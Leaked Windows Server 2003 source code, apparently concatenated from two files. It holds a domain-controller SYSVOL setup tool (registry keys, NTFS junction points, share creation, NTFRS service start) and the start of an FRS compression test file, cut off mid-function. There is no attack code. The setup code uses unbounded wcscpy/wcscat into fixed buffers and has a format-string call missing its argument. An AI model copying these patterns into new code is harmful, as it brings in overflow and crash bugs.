               sizeof(msg),
               NULL );

    if( i )
        fprintf( stderr, "%ws: %ws\n", text ? text : L"", msg );
    else
        fprintf( stderr, "%ws: error %d\n", text ? text : L"", code );
}

//
// Write a string value to the registry
//
BOOLEAN
WriteRegistry( LPWSTR KeyName, LPWSTR ValueName, LPWSTR Value )
{
    HKEY hKey;
    DWORD disposition;
    LONG retval;

    //
    // First ensure that 'keyname' exists in the registry
    //

    retval = RegCreateKeyEx(
                    HKEY_LOCAL_MACHINE,
                    KeyName,
                    NULL,
                    NULL,
                    REG_OPTION_NON_VOLATILE,
                    KEY_ALL_ACCESS,
                    NULL,
                    &hKey,
                    &disposition
                   );

    if( retval != ERROR_SUCCESS ) {
        errmsg( KeyName, retval );
        return FALSE;
    }

    if( ARGUMENT_PRESENT( ValueName ) ) {

        retval = RegSetValueEx(
                    hKey,
                    ValueName,
                    0,
                    REG_SZ,
                    (BYTE *)Value,
                    (wcslen( Value ) + 1) * sizeof( WCHAR )
                 );

        if( retval != ERROR_SUCCESS ) {
            errmsg( ValueName, retval );
            RegCloseKey( hKey );
            return FALSE;
        }
    }

    RegCloseKey( hKey );
    return TRUE;
}

//
// Write a DWORD value to the registry
//
BOOLEAN
WriteRegistry( LPWSTR KeyName, LPWSTR ValueName, DWORD Value )
{
    HKEY hKey;
    DWORD disposition;
    LONG retval;

    //
    // First ensure that 'keyname' exists in the registry
    //

    retval = RegCreateKeyEx(
                    HKEY_LOCAL_MACHINE,
                    KeyName,
                    NULL,
                    NULL,
                    REG_OPTION_NON_VOLATILE,
                    KEY_ALL_ACCESS,
                    NULL,
                    &hKey,
                    &disposition
                   );

    if( retval != ERROR_SUCCESS ) {
        errmsg( KeyName, retval );
        return FALSE;
    }

    if( ARGUMENT_PRESENT( ValueName ) ) {

        retval = RegSetValueEx(
                    hKey,
                    ValueName,
                    0,
                    REG_DWORD,
                    (BYTE *)&Value,
                    sizeof( Value )
                 );

        if( retval != ERROR_SUCCESS ) {
            errmsg( ValueName, retval );
            RegCloseKey( hKey );
            return FALSE;
        }
    }

    RegCloseKey( hKey );
    return TRUE;
}

//
// Make sure that 'DirName' exists.  Create it if it doesn't
//
BOOLEAN
EnsureDirectoryExists( LPWSTR DirName )
{
    DWORD retval;

    retval = GetFileAttributes( DirName );

    if( retval == 0xFFFFFFFF ) {
        printf( "    Create directory: %ws\n", DirName );
        if( !CreateDirectory( DirName, NULL ) ) {
            retval = GetLastError();
            errmsg( DirName, GetLastError() );
            return FALSE;
        }
    } else if( !(retval & FILE_ATTRIBUTE_DIRECTORY) ) {
        fprintf( stderr, "Not a directory: %ws\n", DirName );
        return FALSE;
    }

    return TRUE;
}

BOOLEAN
LinkAToB( LPWSTR DirA, LPWSTR DirB )
{
    NTSTATUS Status;
    HANDLE Handle;
    UNICODE_STRING UnicodeNameB;
    UNICODE_STRING DosNameB;
    IO_STATUS_BLOCK IoStatusBlock;
    PREPARSE_DATA_BUFFER ReparseBufferHeader;
    PCHAR ReparseBuffer;
    USHORT ReparseDataLength;

    if( !EnsureDirectoryExists( DirA ) ||
        !EnsureDirectoryExists( DirB ) ) {

        return FALSE;
    }

    Handle = CreateFile( DirA,
                        GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS,
                        NULL
                        );

    if( Handle == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "Unable to open %ws", DirA );
        errmsg( (LPWSTR)NULL, GetLastError() );
        return FALSE;
    }

    //
    // Get the NT path name of the directory to which we want to link
    //
    if( !RtlDosPathNameToNtPathName_U(
                            DirB,
                            &UnicodeNameB,
                            NULL,
                            NULL
                            )) {
        errmsg( DirB, GetLastError() );
        return FALSE;
    }
    RtlInitUnicodeString( &DosNameB, DirB);

    //
    //  Set the reparse point with mount point or symbolic link tag and determine
    //  the appropriate length of the buffer.
    //

    ReparseDataLength = (FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) -
                        REPARSE_DATA_BUFFER_HEADER_SIZE) +
                        UnicodeNameB.Length + sizeof(UNICODE_NULL) +
                        DosNameB.Length + sizeof(UNICODE_NULL);

    //
    //  Allocate a buffer to set the reparse point.
    //

    ReparseBufferHeader = (PREPARSE_DATA_BUFFER)LocalAlloc(  LPTR,
                                                    REPARSE_DATA_BUFFER_HEADER_SIZE +
                                                    ReparseDataLength
                                                    );

    if (ReparseBufferHeader == NULL) {
        CloseHandle( Handle );
        errmsg( "Unable to allocate reparse buffer", GetLastError() );
        return FALSE;
    }

    ReparseBufferHeader->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    ReparseBufferHeader->ReparseDataLength = (USHORT)ReparseDataLength;
    ReparseBufferHeader->Reserved = 0;

    ReparseBufferHeader->SymbolicLinkReparseBuffer.SubstituteNameOffset = 0;
    ReparseBufferHeader->SymbolicLinkReparseBuffer.SubstituteNameLength = UnicodeNameB.Length;
    ReparseBufferHeader->SymbolicLinkReparseBuffer.PrintNameOffset = UnicodeNameB.Length + sizeof( UNICODE_NULL );
    ReparseBufferHeader->SymbolicLinkReparseBuffer.PrintNameLength = DosNameB.Length;
    RtlCopyMemory(
        ReparseBufferHeader->SymbolicLinkReparseBuffer.PathBuffer,
        UnicodeNameB.Buffer,
        UnicodeNameB.Length
        );
    RtlCopyMemory(
        (PCHAR)(ReparseBufferHeader->SymbolicLinkReparseBuffer.PathBuffer)+
        UnicodeNameB.Length + sizeof(UNICODE_NULL),
        DosNameB.Buffer,
        DosNameB.Length
        );

    Status = NtFsControlFile(
                 Handle,
                 NULL,
                 NULL,
                 NULL,
                 &IoStatusBlock,
                 FSCTL_SET_REPARSE_POINT,
                 ReparseBufferHeader,
                 REPARSE_DATA_BUFFER_HEADER_SIZE + ReparseBufferHeader->ReparseDataLength,
                 NULL,                // no output buffer
                 0                    // output buffer length
                 );

    LocalFree( (HLOCAL)ReparseBufferHeader );

    CloseHandle( Handle );

    if (!NT_SUCCESS(Status)) {

        switch( Status ) {
        case STATUS_VOLUME_NOT_UPGRADED:
        case STATUS_INVALID_DEVICE_REQUEST:
            printf( "%ws must be on an NT5 NTFS volume.\n", DirA );
            break;

        default:
            printf( "Unable to set reparse point data, status %X", Status );
            break;
        }

        return FALSE;
    }

    return TRUE;
}

//
// Create the system volume subtree
//
BOOLEAN
CreateSysVolTree( LPWSTR SysVolPath, BOOLEAN IsFirstDCInDomain , PWCHAR domainName)
{
    DWORD i;
    WCHAR bufA[ MAX_PATH ];
    WCHAR bufB[ MAX_PATH ];

    printf( "Checking %ws subtree at %ws\n", SysVolShare, SysVolPath );

    if( !EnsureDirectoryExists( SysVolPath) ) {
        return FALSE;
    }

    //
    // First create the static system volume directories
    //
    for( i = 0; StaticSysvolDirs[i]; i++ ) {
        wcscpy( bufA, SysVolPath );
        wcscat( bufA, L"\\" );
        wcscat( bufA, StaticSysvolDirs[i]  );

        if( !EnsureDirectoryExists( bufA ) ) {
            return FALSE;
        }
    }

    //
    // Create the DNS domain link for the sysvol share
    //
    wcscpy( bufA, SysVolPath );
    wcscat( bufA, L"\\sysvol\\" );
    wcscat( bufA, domainName );

    wcscpy( bufB, SysVolPath );
    wcscat( bufB, L"\\domain" );

    if( !LinkAToB( bufA, bufB ) ) {
        return FALSE;
    }

    //
    // Create the enterprise link for the sysvol share
    //
    wcscpy( bufA, SysVolPath );
    wcscat( bufA, L"\\sysvol\\enterprise" );

    wcscpy( bufB, SysVolPath );
    wcscat( bufB, L"\\enterprise" );

    if( !LinkAToB( bufA, bufB ) ) {
        return FALSE;
    }

    //
    // Create the DNS domain link in the staging area
    //
    wcscpy( bufA, SysVolPath );
    wcscat( bufA, L"\\staging areas\\" );
    wcscat( bufA, domainName );

    wcscpy( bufB, SysVolPath );
    wcscat( bufB, L"\\staging\\domain" );

    if( !LinkAToB( bufA, bufB ) ) {
        return FALSE;
    }

    //
    // Create the enterprise link in the staging area
    //
    wcscpy( bufA, SysVolPath );
    wcscat( bufA, L"\\staging areas\\enterprise" );

    wcscpy( bufB, SysVolPath );
    wcscat( bufB, L"\\staging\\enterprise" );

    if( !LinkAToB( bufA, bufB ) ) {
        return FALSE;
    }

    //
    // Finally, if we are the first DC initialized in this domain,
    //  we need to create the scripts directory
    //
    if( IsFirstDCInDomain ) {

        wcscpy( bufA, SysVolPath );
        wcscat( bufA, L"\\domain\\scripts" );

        if( !EnsureDirectoryExists( bufA ) ) {
            return FALSE;
        }
    }

    return TRUE;
}

//
// Create the system volume share.
//
BOOLEAN
CreateSysVolShare( LPWSTR SysVolPath )
{
    DWORD dwType, retval;
    SHARE_INFO_2 si2, *psi2;

    printf( "Creating system volume share:\n" );

    //
    // Blow away the current sysvol share if it exists
    //
    retval = NetShareGetInfo( NULL, SysVolShare, 2, (LPBYTE *)&psi2 );

    if( retval == NO_ERROR ) {
        if( psi2->shi2_type != STYPE_DISKTREE ) {
            fprintf( stderr, "%ws is shared, but is not a disk share!\n" );
            return FALSE;
        }

        printf( "    Delete current share: %ws=%ws\n", psi2->shi2_netname, psi2->shi2_path );

        NetApiBufferFree( psi2 );

        //
        // Try to delete this share
        //
        retval = NetShareDel( NULL, SysVolShare, 0 );
        if( retval != NO_ERROR ) {
            errmsg( "Unable to delete sysvol share", retval );
            return FALSE;
        }
    }

    //
    // Add the new sysvol share
    //
    si2.shi2_netname = SysVolShare;
    si2.shi2_type = STYPE_DISKTREE;
    si2.shi2_remark = SysVolRemark;
    si2.shi2_permissions = 0;
    si2.shi2_max_uses = (DWORD)-1;
    si2.shi2_current_uses = 0;
    si2.shi2_path = SysVolPath;
    si2.shi2_passwd = 0;

    printf( "    Add share: %ws=%ws\n", SysVolShare, SysVolPath );
    retval = NetShareAdd( NULL, 2, (LPBYTE)&si2, &dwType );

    if( retval != NO_ERROR ) {
        errmsg( "Unable to share new sysvol share", retval );
        return FALSE;
    }

    //
    // Add the registry key telling netlogon to share this out as the system volume share
    //
    printf( "    Add netlogon sysvol registry key\n" );

    return WriteRegistry( L"System\\CurrentControlSet\\Services\\Netlogon\\Parameters",
                          L"SysVol",
                          SysVolPath
                        );
}

//
// Add the registry keys needed for NTFRS.  Do what DcPromo would have done
//
BOOLEAN
AddRegKeys(
    IN PWCHAR   ReplicaSetName,
    IN PWCHAR   ReplicaSetType,
    IN DWORD    ReplicaSetPrimary,
    IN PWCHAR   ReplicaSetStage,
    IN PWCHAR   ReplicaSetRoot )
{
    WCHAR   KeyName[512];

    //
    // Make sure the NTFRS section is there
    //
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs", 0, (DWORD)0 );
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters", 0, (DWORD)0 );
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters\\Sysvol", 0, (DWORD)0 );

    //
    // Sysvol key + values
    //
    wcscpy( KeyName, L"System\\CurrentControlSet\\services\\NtFrs\\Parameters\\Sysvol\\" );
    wcscat( KeyName, ReplicaSetName );
    WriteRegistry( KeyName, DSROLEP_FRS_COMMAND, DSROLEP_FRS_CREATE );
    WriteRegistry( KeyName, DSROLEP_FRS_NAME, ReplicaSetName );
    WriteRegistry( KeyName, DSROLEP_FRS_TYPE, ReplicaSetType );
    WriteRegistry( KeyName, DSROLEP_FRS_PRIMARY, (DWORD)ReplicaSetPrimary );
    WriteRegistry( KeyName, DSROLEP_FRS_ROOT, ReplicaSetRoot );
    WriteRegistry( KeyName, DSROLEP_FRS_STAGE, ReplicaSetStage );

    return TRUE;
}

//
// Commit the registry keys so that if NtFrs is running it can now
// pick up a consistent set of values.
//
BOOLEAN
CommitRegKeys(
    VOID )
{
    //
    // Make sure the NTFRS section is there
    //
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs", 0, (DWORD)0 );
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters", 0, (DWORD)0 );
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters\\Sysvol", 0, (DWORD)0 );

    //
    // Commit both sysvols
    //
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters\\Sysvol",
                  DSROLEP_FRS_COMMITTED, (DWORD)1 );
    return TRUE;
}

//
// Commit the registry keys so that if NtFrs is running it can now
// pick up a consistent set of values.
//
BOOLEAN
DeleteRegKeys(
    VOID )
{
    DWORD WStatus;
    HKEY  HKey = 0;
    WCHAR KeyBuf[MAX_PATH + 1];

    printf("Delete registry keys.\n");

    //
    // Make sure the NTFRS section is there
    //
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs", 0, (DWORD)0 );
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters", 0, (DWORD)0 );
    WriteRegistry( L"System\\CurrentControlSet\\services\\NtFrs\\Parameters\\Sysvol", 0, (DWORD)0 );

    WStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                           L"System\\CurrentControlSet\\services\\NtFrs\\Parameters\\Sysvol",
                           0,
                           KEY_ALL_ACCESS,
                           &HKey);
    if (WStatus != ERROR_SUCCESS) {
        errmsg("Cannot open registry", WStatus);
        return FALSE;
    }
    WStatus = RegDeleteValue(HKey, DSROLEP_FRS_COMMITTED);
    if (WStatus != ERROR_SUCCESS && WStatus != ERROR_FILE_NOT_FOUND) {
        errmsg("Cannot delete registry value", WStatus);
        return FALSE;
    }
    //
    // Delete the subkeys
    //
    do {
        WStatus = RegEnumKey(HKey, 0, KeyBuf, MAX_PATH + 1);
        if (WStatus == ERROR_SUCCESS) {
            WStatus = RegDeleteKey(HKey, KeyBuf);
        }
    } while (WStatus == ERROR_SUCCESS);
    if (WStatus != ERROR_NO_MORE_ITEMS) {
        errmsg("Cannot delete registry key", WStatus);
        return FALSE;
    }
    RegCloseKey(HKey);
    return TRUE;
}

//
// Set FRS to auto start
//
BOOLEAN
SetFRSAutoStart( void )
{
    SC_HANDLE   ServiceHandle;
    SC_HANDLE   SCMHandle;

    printf( "Set NTFRS to Auto Start\n" );

    //
    // Contact the SC manager.
    //
    SCMHandle = OpenSCManager(NULL,
                              NULL,
                              SC_MANAGER_CONNECT);
    if (SCMHandle == NULL) {
        errmsg("Can't set NtFrs to Auto Start", GetLastError());
        return FALSE;
    }

    //
    // Contact the NtFrs service.
    //
    ServiceHandle = OpenService(SCMHandle,
                                DSROLEP_FRS_SHORT_NAME,
                                   SERVICE_INTERROGATE |
                                   SERVICE_PAUSE_CONTINUE |
                                   SERVICE_QUERY_STATUS |
                                   SERVICE_START |
                                   SERVICE_STOP |
                                   SERVICE_CHANGE_CONFIG);
    if (ServiceHandle == NULL) {
        errmsg("Can't set NtFrs to Auto Start", GetLastError());
        return FALSE;
    }
    CloseServiceHandle(SCMHandle);

    //
    // Service starts automatically at startup
    //
    if (!ChangeServiceConfig(ServiceHandle,
                             SERVICE_NO_CHANGE,
                             SERVICE_AUTO_START,
                             SERVICE_NO_CHANGE,
                             NULL,
                             NULL,
                             NULL,
                             NULL,
                             NULL,
                             NULL,
                             DSROLEP_FRS_LONG_NAME)) {
        errmsg("Can't set NtFrs to Auto Start", GetLastError());
        return FALSE;
    }
    CloseServiceHandle(ServiceHandle);
    return TRUE;
}

//
// Start FRS
//
BOOLEAN
StartFRS( void )
{
    DWORD           WStatus;
    SC_HANDLE       ServiceHandle;
    SC_HANDLE       SCMHandle;
    SERVICE_STATUS  ServiceStatus;

    printf( "Start NTFRS\n" );

    //
    // Contact the SC manager.
    //
    SCMHandle = OpenSCManager(NULL,
                              NULL,
                              SC_MANAGER_CONNECT);
    if (SCMHandle == NULL) {
        errmsg("Can't start NtFrs", GetLastError());
        return FALSE;
    }

    //
    // Contact the NtFrs service.
    //
    ServiceHandle = OpenService(SCMHandle,
                                DSROLEP_FRS_SHORT_NAME,
                                   SERVICE_INTERROGATE |
                                   SERVICE_PAUSE_CONTINUE |
                                   SERVICE_QUERY_STATUS |
                                   SERVICE_START |
                                   SERVICE_STOP |
                                   SERVICE_CHANGE_CONFIG);
    if (ServiceHandle == NULL) {
        errmsg("Can't start NtFrs", GetLastError());
        return FALSE;
    }
    CloseServiceHandle(SCMHandle);

    //
    // stop the service
    //
    ControlService(ServiceHandle, SERVICE_CONTROL_STOP, &ServiceStatus);

    //
    // Start the service
    //
    if (!StartService(ServiceHandle, 0, NULL)) {
        //
        // May be shutting down; retry in a bit
        //
        Sleep(3 * 1000);
        if (!StartService(ServiceHandle, 0, NULL)) {
            WStatus = GetLastError();
            if (WStatus != ERROR_SERVICE_ALREADY_RUNNING) {
                errmsg("Can't start NtFrs", WStatus);
                return FALSE;
            }
        }
    }
    CloseServiceHandle(ServiceHandle);
    return TRUE;
}

BOOLEAN
IsThisADC(
    IN PWCHAR domainName )
{
    DWORD   WStatus;
    PWCHAR  p;
    DSROLE_PRIMARY_DOMAIN_INFO_BASIC *DsRole;

    //
    // Is this a domain controller?
    //
    WStatus = DsRoleGetPrimaryDomainInformation(NULL,
                                                DsRolePrimaryDomainInfoBasic,
                                                (PBYTE *)&DsRole);
    if (WStatus != ERROR_SUCCESS) {
        errmsg("Can't get primary domain information", WStatus);
        return FALSE;
    }

    //
    // Domain Controller (DC)
    //
    if (DsRole->MachineRole == DsRole_RoleBackupDomainController ||
        DsRole->MachineRole == DsRole_RolePrimaryDomainController) {
        if (!DsRole->DomainNameDns) {
            errmsg( "Unable to get domain name", ERROR_PATH_NOT_FOUND );
            return FALSE;
        }
        wcscpy(domainName, DsRole->DomainNameDns);
        DsRoleFreeMemory(DsRole);
        for( p = domainName; *p != L'\0'; p++ );
        if( *(p-1) == L'.' ) {
            *(p-1) = L'\0';
        }
        return TRUE;
    }
    DsRoleFreeMemory(DsRole);
    return FALSE;
}

/*
 * Make it so NTFRS will run on this DC
 */
__cdecl
main( int argc, char *argv[] )
{
    DWORD i;
    LONG retval;
    BOOLEAN IsFirstDCInDomain = FALSE;
    BOOLEAN IsFirstDCInEnterprise = FALSE;
    WCHAR SysVolPath[ MAX_PATH ], stage[ MAX_PATH ], root[ MAX_PATH ];
    DWORD pathType;
    WCHAR domainName[512];

    SysVolPath[0] = 0;

    if( IsThisADC( domainName ) == FALSE ) {
        fprintf( stderr, "This program can only be run on a DC!\n" );
        return 1;
    }

    for( i = 1; i < (DWORD)argc; i++ ) {
        switch( argv[i][0] ) {
        case '/':
        case '-':
                switch( argv[i][1] ) {
                case 'D':
                case 'd':
                    IsFirstDCInDomain = TRUE;
                    break;
                case 'E':
                case 'e':
                    IsFirstDCInEnterprise = TRUE;
                    IsFirstDCInDomain = TRUE;
                    break;
                default:
                    fprintf( stderr, "Unrecognized option: %c\n\n", argv[i][1] );
                    Usage( argc, argv );
                    return 1;
                }
                break;
        default:

            if( SysVolPath[0] != 0 ) {
                fprintf( stderr, "Too many 'sysvol' paths!  Need quotes?\n\n" );
                Usage( argc, argv );
                return 1;
            }

            mbstowcs( SysVolPath, argv[i], sizeof( SysVolPath ) );

            //
            // Make sure the system volume path is reasonable
            //
            retval = NetpPathType( NULL, SysVolPath, &pathType, 0 );

            if( retval != NO_ERROR || pathType != ITYPE_PATH_ABSD ) {
                fprintf( stderr, "Invalid system volume path.  Must be an absolute path.\n" );
                return 1;
            }

            break;
        }
    }

    if( SysVolPath[0] == 0 ) {
        Usage( argc, argv );
        return 1;
    }

    printf( "Initializing the NT MultiMaster File Replication Service:\n" );
    printf( "    Domain: %ws\n", domainName );

    if( IsFirstDCInDomain ) {
        printf( "    First DC in the domain\n" );
    }
    if( IsFirstDCInEnterprise ) {
        printf( "    First DC in the enterprise\n" );
    }
    printf( "    System Volume: %ws\n", SysVolPath );

    //
    // Create the sysvol tree and share it out
    //
    if( !CreateSysVolTree( SysVolPath, IsFirstDCInDomain, domainName ) ||
        !CreateSysVolShare( SysVolPath ) ) {

        return 1;
    }

    //
    // Add the registry keys for the NTFRS enterprise volume
    //
    wcscpy( stage, SysVolPath );
    wcscat( stage, L"\\staging areas\\enterprise" );

    wcscpy( root, SysVolPath );
    wcscat( root, L"\\sysvol\\enterprise" );

    if( !AddRegKeys( L"enterprise",
                     L"enterprise",
                     IsFirstDCInEnterprise,
                     stage,
                     root ) ) {
        goto errout;
    }

    //
    // Add the registry keys for the NTFRS domain volume
    //
    wcscpy( stage, SysVolPath );
    wcscat( stage, L"\\staging areas\\" );
    wcscat( stage, domainName );

    wcscpy( root, SysVolPath );
    wcscat( root, L"\\sysvol\\" );
    wcscat( root, domainName );

    if( !AddRegKeys( domainName,
                     L"domain",
                     IsFirstDCInDomain,
                     stage,
                     root ) ) {
        goto errout;
    }

    //
    // Commit the keys only after all of the values are set without error.
    // Otherwise, a running NtFrs might pick up the keys while they are in
    // an incomplete state.
    //
    if( !CommitRegKeys()) {
        goto errout;
    }

    //
    // Now ensure that the replication service is running, and will run at each boot
    //
    if( !SetFRSAutoStart() || !StartFRS() ) {
        goto errout;
    }

    printf( "Success!\n" );

    return 0;

errout:
    fprintf( stderr, "Warning: SYSVOL share path may have been changed.\n" );
    return 1;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\frscompress\frscompress.c ===
#include <ntreppch.h>
#pragma  hdrstop

#include <frs.h>
#include <tablefcn.h>
#include <perrepsr.h>
#define INITGUID
#include "frstrace.h"
/////////////////////////////////FROM MAIN.c ////////////////////////////////////

PCHAR LatestChanges[] = {

    "Latest changes:",
    "  RC3-Q1: 432553, 436070, 432549",
    "  WMI Perf Tracing",
    "  Allow all junction points",
    "  Automatic trigger of non-auth restore on WRAP_ERROR",
    "  Allow changing replica root path",
    "  03/18/00 - sudarc - checkin",
    "  03/15/00 - 32/64 Comm fix.",
    "  03/20    - merge with sudarc.",
    "  03/30/00 - sudarc - checkin - volatile connection cleanup.",
    "  04/14/00 - sudarc - checkin - bugbug, memleak, and poll summary eventlog.",

    NULL
};

HANDLE  ShutDownEvent;
HANDLE  ShutDownComplete;
HANDLE  DataBaseEvent;
HANDLE  JournalEvent;
HANDLE  ChgOrdEvent;
HANDLE  ReplicaEvent;
HANDLE  CommEvent;
HANDLE  DsPollEvent;
HANDLE  DsShutDownComplete;
PWCHAR  ServerPrincName;
BOOL    IsAMember               = FALSE;
BOOL    IsADc                   = FALSE;
BOOL    IsAPrimaryDc            = FALSE;
BOOL    EventLogIsRunning       = FALSE;
BOOL    RpcssIsRunning          = FALSE;
BOOL    RunningAsAService       = TRUE;
BOOL    NoDs                    = FALSE;
BOOL    FrsIsShuttingDown       = FALSE;
BOOL    FrsIsAsserting          = FALSE;

//
// Require mutual authentication
//
BOOL    MutualAuthenticationIsEnabled;
BOOL    MutualAuthenticationIsEnabledAndRequired;

//
// Directory and file filter lists from registry.
//
PWCHAR  RegistryFileExclFilterList;
PWCHAR  RegistryFileInclFilterList;

PWCHAR  RegistryDirExclFilterList;
PWCHAR  RegistryDirInclFilterList;

//
// Synchronize the shutdown thread with the service controller
//
CRITICAL_SECTION    ServiceLock;

//
// Synchronize initialization
//
CRITICAL_SECTION    MainInitLock;

//
// Convert the ANSI ArgV into a UNICODE ArgV
//
PWCHAR  *WideArgV;

//
// Process Handle
//
HANDLE  ProcessHandle;

//
// Working path / DB Log path
//
PWCHAR  WorkingPath;
PWCHAR  DbLogPath;

//
// Database directories (UNICODE and ASCII)
//
PWCHAR  JetPath;
PWCHAR  JetFile;
PWCHAR  JetFileCompact;
PWCHAR  JetSys;
PWCHAR  JetTemp;
PWCHAR  JetLog;

PCHAR   JetPathA;
PCHAR   JetFileA;
PCHAR   JetFileCompactA;
PCHAR   JetSysA;
PCHAR   JetTempA;
PCHAR   JetLogA;

//
// Limit the amount of staging area used (in kilobytes). This is
// a soft limit, the actual usage may be higher.
//
DWORD StagingLimitInKb;

//
// Default staging limit in kb to be assigned to a new staging area.
//
DWORD DefaultStagingLimitInKb;

//
// Max number replica sets and Jet Sessions allowed.
//
ULONG MaxNumberReplicaSets;
ULONG MaxNumberJetSessions;

//
// Maximum number of outbound changeorders allowed outstanding per connection.
//
ULONG MaxOutLogCoQuota;
//
// If TRUE then try to preserve existing file OIDs whenever possible.
//  -- See Bug 352250 for why this is a risky thing to do.
//
BOOL  PreserveFileOID;

//
// Limits on how many time and for how long we will continue to retry a
// change order when the parent is missing.
//
ULONG MaxCoRetryTimeoutMinutes;
ULONG MaxCoRetryTimeoutCount;

//
// Major/minor  (see frs.h)
//
ULONG   NtFrsMajor      = NTFRS_MAJOR;
ULONG   NtFrsMinor      = NTFRS_MINOR;

ULONG   NtFrsStageMajor = NTFRS_STAGE_MAJOR;
ULONG   NtFrsStageMinor = NTFRS_STAGE_MINOR_1;

ULONG   NtFrsCommMinor  = NTFRS_COMM_MINOR_3;

PCHAR   NtFrsModule     = __FILE__;
PCHAR   NtFrsDate       = __DATE__;
PCHAR   NtFrsTime       = __TIME__;

//
// Shutdown timeout
//

ULONG   ShutDownTimeOut = DEFAULT_SHUTDOWN_TIMEOUT;

//
// A useful thing to have around
//
WCHAR   ComputerName[MAX_COMPUTERNAME_LENGTH + 2];
PWCHAR  ComputerDnsName;
PWCHAR  ServiceLongName;

//
// The rpc server may reference this table as soon as the rpc interface
// is registered. Make sure it is setup.
//
extern PGEN_TABLE ReplicasByGuid;

//
// The staging area table is references early in the startup process
//
extern PGEN_TABLE   StagingAreaTable;

PGEN_TABLE   CompressionTable;

//
// Size of buffer to use when enumerating directories. Actual memory
// usage will be #levels * SizeOfBuffer.
//
LONG    EnumerateDirectorySizeInBytes;




BOOL    MainInitHasRun;

//
// Do not accept stop control unless the service is in SERVICE_RUNNING state.
// This prevents the service from getting confused when a stop is called
// while the service is starting.
//
SERVICE_STATUS  ServiceStatus = {
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_START_PENDING,
//        SERVICE_ACCEPT_STOP |
            // SERVICE_ACCEPT_PAUSE_CONTINUE |
        SERVICE_ACCEPT_SHUTDOWN,
        0,
        0,
        0,
        60*1000
};

//
// Supported compression formats.
//

//
// This is the compression format for uncompressed data.
//
DEFINE_GUID ( /* 00000000-0000-0000-0000-000000000000 */
    FrsGuidCompressionFormatNone,
    0x00000000,
    0x0000,
    0x0000,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  );

//
// This is the compression format for data compressed using NTFS's LZNT1 compression
// routines.
//
DEFINE_GUID ( /* 64d2f7d2-2695-436d-8830-8d3c58701e15 */
    FrsGuidCompressionFormatLZNT1,
    0x64d2f7d2,
    0x2695,
    0x436d,
    0x88, 0x30, 0x8d, 0x3c, 0x58, 0x70, 0x1e, 0x15
  );

//
// Fixed guid for the dummy cxtion (aka GhostCxtion) assigned to orphan remote
// change orders whose inbound cxtion has been deleted from the DS but they
// have already past the fetching state and can finish without the real cxtion
// coming back. No authentication checks are made for this dummy cxtion.
//
DEFINE_GUID ( /* b9d307a7-a140-4405-991e-281033f03309 */
    FrsGuidGhostCxtion,
    0xb9d307a7,
    0xa140,
    0x4405,
    0x99, 0x1e, 0x28, 0x10, 0x33, 0xf0, 0x33, 0x09
  );

DEFINE_GUID ( /* 3fe2820f-3045-4932-97fe-00d10b746dbf */
    FrsGhostJoinGuid,
    0x3fe2820f,
    0x3045,
    0x4932,
    0x97, 0xfe, 0x00, 0xd1, 0x0b, 0x74, 0x6d, 0xbf
  );

//
// Static Ghost cxtion structure. This cxtion is assigned to orphan remote change
// orders in the inbound log whose cxtion is deleted from the DS but who have already
// past the fetching state and do not need the cxtion to complete processing. No
// authentication checks are made for this dummy cxtion.
//
PCXTION  FrsGhostCxtion;

SERVICE_STATUS_HANDLE   ServiceStatusHandle = NULL;

VOID
InitializeEventLog(
    VOID
    );

DWORD
FrsSetServiceFailureAction(
    VOID
    );

VOID
FrsRpcInitializeAccessChecks(
    VOID
    );

BOOL
FrsSetupPrivileges (
    VOID
    );

VOID
CfgRegAdjustTuningDefaults(
    VOID
    );

VOID
CommInitializeCommSubsystem(
    VOID
    );

VOID
SndCsInitialize(
    VOID
    );


// FRS Capacity Planning
//
#define RESOURCE_NAME       L"MofResourceName"
#define IMAGE_PATH          L"ntfrs.exe"

DWORD       FrsWmiEventTraceFlag          = FALSE;
TRACEHANDLE FrsWmiTraceRegistrationHandle = (TRACEHANDLE) 0;
TRACEHANDLE FrsWmiTraceLoggerHandle       = (TRACEHANDLE) 0;

// This is the FRS control Guid for the group of Guids traced below
//
DEFINE_GUID ( /* 78a8f0b1-290e-4c4c-9720-c7f1ef68ce21 */
    FrsControlGuid,
    0x78a8f0b1,
    0x290e,
    0x4c4c,
    0x97, 0x20, 0xc7, 0xf1, 0xef, 0x68, 0xce, 0x21
  );

// Traceable Guids start here
//
DEFINE_GUID ( /* 2eee6bbf-6665-44cf-8ed7-ceea1d306085 */
    FrsTransGuid,
    0x2eee6bbf,
    0x6665,
    0x44cf,
    0x8e, 0xd7, 0xce, 0xea, 0x1d, 0x30, 0x60, 0x85
  );

TRACE_GUID_REGISTRATION FrsTraceGuids[] =
{
    { & FrsTransGuid, NULL }
};

#define FrsGuidCount (sizeof(FrsTraceGuids) / sizeof(TRACE_GUID_REGISTRATION))

//
// Trace initialization / shutdown routines
//


VOID
MainInit(
    VOID
    )
/*++
Routine Description:
    Initialize anything necessary to run the service

Arguments:
    None.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "MainInit:"

    EnterCriticalSection(&MainInitLock);
    //
    // No need to initialize twice
    //
    if (MainInitHasRun) {
        LeaveCriticalSection(&MainInitLock);
        return;
    }

    //
    // SETUP THE INFRASTRUCTURE
    //
//    DEBUG_INIT();

    //
    // Fetch the staging file limit
    //

